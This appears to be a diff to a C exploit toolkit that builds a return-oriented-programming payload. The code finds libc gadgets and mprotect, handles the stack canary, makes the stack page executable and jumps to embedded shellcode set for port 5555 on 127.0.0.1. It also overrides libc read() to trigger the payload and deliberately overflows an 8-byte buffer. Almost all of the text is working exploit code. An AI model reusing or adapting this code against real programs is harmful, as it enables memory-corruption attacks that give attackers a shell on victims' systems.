@@ -25,6 +25,13 @@ typedef union AddressUnion {
 	char	c[8];
 } AddressUnion, *AddressUnionPtr;
 
+typedef struct BaseAddresses {
+	Pointer buffer_base;
+	Pointer libc_base;
+	Pointer pie_base;
+	Pointer stack_base;
+} BaseAddresses, *BaseAddressesPtr;
+
 typedef struct ShellCode {
 	unsigned char	prolog[18];
 	unsigned short	port;
@@ -112,19 +119,16 @@ static Payload payload = {
 	} // .pl_scu
 }; // payload
 
-_Bool initialized = 0;
+static _Bool	initialized	= 0;
 
-Pointer libc_mprotect					= NULL;
-Pointer libc_popRDI					= NULL;
-Pointer libc_popRSI					= NULL;
-Pointer libc_popRDX					= NULL;
+static Pointer	libc_mprotect	= NULL;
+static Pointer	libc_popRDI	= NULL;
+static Pointer	libc_popRSI	= NULL;
+static Pointer	libc_popRDX	= NULL;
 
-size_t  libc_size					= 0;
+static size_t	libc_size	= 0;
 
-Pointer libc_base					= NULL;
-Pointer pie_base					= NULL;
-Pointer stack_base					= NULL;
-Pointer buffer_base					= NULL;
+static BaseAddresses	baseAddresses	= {NULL, NULL, NULL, NULL};
 
 static Pointer pageBase(Pointer p) {
 	return (Pointer) (((unsigned long) p) & (-1 ^ getpagesize() - 1));
@@ -145,23 +149,24 @@ static Pointer stackPage(void) {
 } // stackPage()
 
 static Pointer findGadget(const Pointer start, const char *gadget, const size_t size) {
-	return strnstr(libc_base, gadget, size);
+	return strnstr(baseAddresses.libc_base, gadget, size);
 } // findGadget()
 
 static void initialize(void)
 {
 	if (!initialized)
 	{
+		libc_size       = getpagesize() * 100; // Punt
+
 		libc_mprotect	= dlsym(RTLD_NEXT, s_libc_mprotect);
-		libc_base	= elfBase(libc_mprotect);
 
-		libc_popRDI	= findGadget(libc_base, s_libc_popRDI, libc_size);
-		libc_popRSI	= findGadget(libc_base, s_libc_popRSI, libc_size);
-		libc_popRDX	= findGadget(libc_base, s_libc_popRDX, libc_size);
+		baseAddresses.libc_base  = elfBase(libc_mprotect);
+		baseAddresses.pie_base   = elfBase(initialize);
+		baseAddresses.stack_base = stackPage();
 
-		pie_base	= elfBase(initialize);
-
-		stack_base	= stackPage();
+		libc_popRDI = findGadget(baseAddresses.libc_base, s_libc_popRDI, libc_size);
+		libc_popRSI = findGadget(baseAddresses.libc_base, s_libc_popRSI, libc_size);
+		libc_popRDX = findGadget(baseAddresses.libc_base, s_libc_popRDX, libc_size);
 
 		initialized = 1;
 	} // if
@@ -169,61 +174,61 @@ static void initialize(void)
 	return;
 } // initialize()
 
-static Pointer baseAddress(char base) {
+static Pointer baseAddress(char base, BaseAddressesPtr baseAddressesPtr) {
 	switch (base) {
-		case 'B' : return buffer_base;
-		case 'L' : return libc_base;
-		case 'S' : return stack_base; // Actually just base of current stack page
-		case 'P' : return pie_base;
+		case 'B' : return baseAddressesPtr->buffer_base;
+		case 'L' : return baseAddressesPtr->libc_base;
+		case 'P' : return baseAddressesPtr->pie_base;
+		case 'S' : return baseAddressesPtr->stack_base; // Actually just base of current stack page
 		default  : return 0;
 	} // switch
 } // baseAddress()
 
-static inline Offset pointerToOffset(Pointer p, char base) {
-	return (Offset) { (p - baseAddress(base)), base, '~' };
+Offset pointerToOffset(Pointer p, char base, BaseAddressesPtr baseAddressesPtr) {
+	return (Offset) { (p - baseAddress(base, baseAddressesPtr)), base, '~' };
 } // pointerToOffset()
 
-static inline Offset indirectToOffset(Pointer p, char base) {
-	return (Offset) { (p - baseAddress(base)), base, '*' };
+Offset indirectToOffset(Pointer p, char base, BaseAddressesPtr baseAddressesPtr) {
+	return (Offset) { (p - baseAddress(base, baseAddressesPtr)), base, '*' };
 } // indirectToOffset()
 
-static inline Pointer offsetToPointer(Offset o) {
-	return (Pointer) (o.r + baseAddress(o.b));
+Pointer offsetToPointer(Offset o, BaseAddressesPtr baseAddressesPtr) {
+	return (Pointer) (o.r + baseAddress(o.b, baseAddressesPtr));
 } // offsetToPointer()
 
-static inline Pointer offsetToIndirect(Offset o) {
-	return *((Pointer *) offsetToPointer(o));
+Pointer offsetToIndirect(Offset o, BaseAddressesPtr baseAddressesPtr) {
+	return *((Pointer *) offsetToPointer(o, baseAddressesPtr));
 } // offsetToIndirect()
 
-static AddressUnion fixupAddressUnion(AddressUnion au) {
+AddressUnion fixupAddressUnion(AddressUnion au, BaseAddressesPtr baseAddressesPtr) {
 	if (au.o.f == '~')
-		return (AddressUnion) { .p = offsetToPointer(au.o) };
+		return (AddressUnion) { .p = offsetToPointer(au.o, baseAddressesPtr) };
 
 	if (au.o.f == '*')
-		return (AddressUnion) { .p = offsetToIndirect(au.o) };
+		return (AddressUnion) { .p = offsetToIndirect(au.o, baseAddressesPtr) };
 
 	return au;
 } // fixupAddressUnion()
 
 static void makeload(PayloadPtr plp) {
-	ptrdiff_t libc_mprotect_offset = libc_mprotect - libc_base;
+	ptrdiff_t libc_mprotect_offset = libc_mprotect - baseAddresses.libc_base;
 
 	// Offsets are relative to the payload
-	buffer_base		= plp;
+	baseAddresses.buffer_base = plp;
 
 	memset(plp->pl_dst, 0, sizeof(plp->pl_dst));
 
-	plp->pl_canary.o	= indirectToOffset(&plp->pl_canary, 'B');
-	plp->pl_rbp.o		= indirectToOffset(&plp->pl_rbp, 'B');
-	plp->pl_popRDI.o	= libc_popRDI?pointerToOffset(libc_popRDI, 'L'):pointerToOffset(&&l_popRDI, 'P');;
-	plp->pl_stackPage.o	= pointerToOffset(stack_base, 'S');
-	plp->pl_popRSI.o	= libc_popRDI?pointerToOffset(libc_popRSI, 'L'):pointerToOffset(&&l_popRSI, 'P');;
+	plp->pl_canary.o	= indirectToOffset(&plp->pl_canary, 'B', &baseAddresses);
+	plp->pl_rbp.o		= indirectToOffset(&plp->pl_rbp, 'B', &baseAddresses);
+	plp->pl_popRDI.o	= libc_popRDI?pointerToOffset(libc_popRDI, 'L', &baseAddresses):pointerToOffset(&&l_popRDI, 'P', &baseAddresses);
+	plp->pl_stackPage.o	= pointerToOffset(baseAddresses.stack_base, 'S', &baseAddresses);
+	plp->pl_popRSI.o	= libc_popRDI?pointerToOffset(libc_popRSI, 'L', &baseAddresses):pointerToOffset(&&l_popRSI, 'P', &baseAddresses);
 	plp->pl_stackSize	= getpagesize();
-	plp->pl_popRDX.o	= libc_popRDX?pointerToOffset(libc_popRDX, 'L'):pointerToOffset(&&l_popRDX, 'P');;
+	plp->pl_popRDX.o	= libc_popRDX?pointerToOffset(libc_popRDX, 'L', &baseAddresses):pointerToOffset(&&l_popRDX, 'P', &baseAddresses);
 	plp->pl_permission	= 0x7;
-	plp->pl_mprotect.o	= pointerToOffset(libc_mprotect, 'L');
+	plp->pl_mprotect.o	= pointerToOffset(libc_mprotect, 'L', &baseAddresses);
 
-	plp->pl_shellCode.o	= pointerToOffset(&plp->pl_scu, 'B');
+	plp->pl_shellCode.o	= pointerToOffset(&plp->pl_scu, 'B', &baseAddresses);
 
 	plp->pl_scu.sc.port     = htons(5555);
 	if (!inet_aton("127.0.0.1", &plp->pl_scu.sc.ipAddress))
@@ -270,16 +275,16 @@ static void dumpload(PayloadPtr plp) {
 	fprintf(stderr, "--------------------------------------------\n");
 } // dumpload()
 
-static void dofixups(Pointer p, size_t n, Pointer selfBase) {
-	buffer_base = selfBase;
+static void dofixups(Pointer p, size_t n, BaseAddressesPtr baseAddressesPtr) {
 	for (AddressUnionPtr aup = (AddressUnionPtr)p; aup < (AddressUnionPtr) (p + n - sizeof(AddressUnionPtr) + 1); aup++)
-		*aup = fixupAddressUnion(*aup);
+		*aup = fixupAddressUnion(*aup, baseAddressesPtr);
 } // dofixups()
 
 static void overflow(Pointer p, size_t n) {
 	char buffer[8] = {0};
 
-	dofixups(p, n, &buffer);
+	baseAddresses.buffer_base = &buffer;;
+	dofixups(p, n, &baseAddresses);
 
 	memcpy(buffer, p, n);
 } // overflow()
@@ -299,7 +304,6 @@ ssize_t read(int fd, void *buf, size_t count) {
 		if (!strncmp(s_makeload, p, strlen(s_makeload))) {
 			p += strlen(s_makeload);
 			makeload(&payload);
-
 			// Parse the stuff after MAKELOAD into s_host:port
 			int nc, ns;
 			char s_host[256];
